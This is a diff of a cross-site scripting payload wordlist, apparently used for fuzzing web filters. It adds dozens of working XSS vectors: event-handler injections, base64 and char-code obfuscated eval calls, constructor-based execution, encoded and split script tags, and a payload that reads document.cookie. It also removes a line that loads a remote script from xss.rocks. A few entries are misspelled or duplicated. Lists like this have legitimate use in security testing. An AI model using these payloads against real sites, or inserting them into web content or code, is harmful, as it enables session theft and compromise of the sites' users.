@@ -1,26 +1,57 @@
 <script>alert(1)</script>
 <ScRiPt>alert(1)</ScRiPt>
 <SCRIPT>alert(1)</SCRIPT>
-<script >alert(1)</script>
-<script	>alert(1)</script>
-<script/src=//xss.rocks/xss.js></script>
-"><script>alert(1)</script>
-'><script>alert(1)</script>
-</script><script>alert(1)</script>
+<script/src=data:,alert(1)>
 <img src=x onerror=alert(1)>
-<img src=x onerror=alert`1`>
-<img src=x onerror="alert(1)">
-<img src=x onerror='alert(1)'>
+<IMG SRC=X ONERROR=ALERT(1)>
 <img/src=x/onerror=alert(1)>
-<IMG SRC=x ONERROR=alert(1)>
-<img src="x" onerror=alert(1)>
 <svg onload=alert(1)>
+<SVG ONLOAD=ALERT(1)>
 <svg/onload=alert(1)>
-<SVG ONLOAD=alert(1)>
-<svg onload="alert(1)">
 <body onload=alert(1)>
-<iframe onload=alert(1)>
-<video onerror=alert(1) src=x>
-<audio onerror=alert(1) src=x>
-<details ontoggle=alert(1)>
-<marquee onstart=alert(1)>
+<input autofocus onfocus=alert(1)>
+<details open ontoggle=alert(1)>
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+<img src=x onerror=alert`1`>
+<svg onload=alert`1`>
+<img src=x onerror=window['alert'](1)>
+<img src=x onerror=window["alert"](1)>
+<img src=x onerror=self.alert(1)>
+<img src=x onerror=top.alert(1)>
+<img src=x onerror=globalThis.alert(1)>
+<img src=x onerror=Function('alert(1)')()>
+<img src=x onerror=new Function('alert(1)')()>
+<img src=x onerror=setTimeout('alert(1)')>
+<img src=x onerror=setInterval('alert(1)',1)>
+<img src=x onerror=[].constructor.constructor('alert(1)')()>
+<img src=x onerror=({}).constructor.constructor('alert(1)')()>
+<script>alert(1)//
+<script>alert(1)/*
+<script>alert(1)<!-- 
+<scr	ipt>alert(1)</scr	ipt>
+<scr
+ipt>alert(1)
+<scr%0dipt>alert(1)
+<scr%0aipt>alert(1)
+<scipt>alert(1)</scipt>
+%3Cscript%3Ealert(1)%3C/script%3E
+%3cscript%3ealert(1)%3c/script%3e
+&lt;script&gt;alert(1)&lt;/script&gt;
+&#60;script&#62;alert(1)&#60;/script&#62;
+<script>alert(1)</script>
+<script>alert(String.fromCharCode(49))</script>
+<script>alert(0x31)</script>
+<script>alert(0b110001)</script>
+<script>alert(0o61)</script>
+<script>alert(49)</script>
+<script>alert(1e0)</script>
+<script>alert(1.0)</script>
+<script>alert(true)</script>
+<script>alert(document['cookie'])</script>
+<script>alert(document['domaIn'])</script>
+<script>a=alert;a(1)</script>
+<script>(alert)(1)</script>
+<script>(1,alert)(1)</script>
+<script>(void alert)(1)</script>
+<script>a=1;eval('ale'+'rt('+a+')')</script>
